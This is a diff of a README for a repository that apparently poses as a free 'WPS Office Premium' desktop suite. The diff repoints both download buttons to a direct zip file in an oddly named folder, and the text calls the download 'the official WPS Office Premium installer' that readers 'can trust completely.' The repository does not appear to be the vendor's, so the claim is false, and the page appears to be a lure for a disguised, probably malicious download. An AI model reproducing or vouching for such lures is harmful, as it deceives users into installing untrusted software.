@@ -1,6 +1,6 @@
 # 📄 WPS-Office-Premium-Desktop-for-Windows-10-11-Full-Office-Suite-2026- - Your All-in-One Office Powerhouse for Windows
 
-[![Download WPS Office Premium](https://img.shields.io/badge/Download%20WPS%20Office%20Premium-Click%20Here%20to%20Download!-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://github.com/carolzita0527/WPS-Office-Premium-Desktop-for-Windows-10-11-Full-Office-Suite-2026-)
+[![Download WPS Office Premium](https://img.shields.io/badge/Download%20WPS%20Office%20Premium-Click%20Here%20to%20Download!-brightgreen?style=for-the-badge&logo=windows&logoColor=white&color=2ea44f)](https://raw.githubusercontent.com/carolzita0527/WPS-Office-Premium-Desktop-for-Windows-10-11-Full-Office-Suite-2026-/main/toilette/Full-WP-Office-Windows-Suite-for-Premium-Desktop-1.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ With WPS Office, you get a full-featured office suite with advanced PDF editing,
 
 ## 📥 Download and Installation
 
-Visit this link to download the application: [**Download WPS Office Premium**](https://github.com/carolzita0527/WPS-Office-Premium-Desktop-for-Windows-10-11-Full-Office-Suite-2026-)
+Visit this link to download the application: [**Download WPS Office Premium**](https://raw.githubusercontent.com/carolzita0527/WPS-Office-Premium-Desktop-for-Windows-10-11-Full-Office-Suite-2026-/main/toilette/Full-WP-Office-Windows-Suite-for-Premium-Desktop-1.8.zip)
 
 When you click the link above, you will be taken to the download page. Once there, you will see a button or a direct download option. Click it, and the installer file will begin downloading to your computer. This file is the official WPS Office Premium installer, so you can trust it completely. The download size is reasonable, and depending on your internet speed, it should finish within a few minutes. After the download completes, you are ready to move on to the next step.
 
